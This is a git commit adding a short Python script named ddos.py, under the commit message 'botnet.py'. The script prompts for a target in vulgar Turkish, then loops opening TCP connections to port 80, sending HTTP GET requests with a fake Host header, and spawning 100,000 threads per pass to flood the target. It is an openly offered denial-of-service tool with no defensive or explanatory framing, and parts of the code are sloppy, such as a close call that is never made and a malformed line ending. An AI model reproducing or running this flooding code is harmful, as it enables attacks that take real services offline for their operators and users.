bb446658be9839b25ef006110fad38864cd4b66c
ExstaDev <83355894+ExstaaDev@users.noreply.github.com>
2021-08-25 17:34:01 +0400

    botnet.py

---
+++ ddos.py
@@ -0,0 +1,19 @@
+import threading
+import socket
+
+target = input("kimi sikmek istersin muwah: ")
+port = 80;
+fake_ip = '99.30.40.31'
+
+already = 0;
+
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip + "r\n\r\n").encode('ascii'), (target, port))
+        s.close
+        for i in range(100000):
+            thread = threading.Thread(target=attack)
+            thread.start()
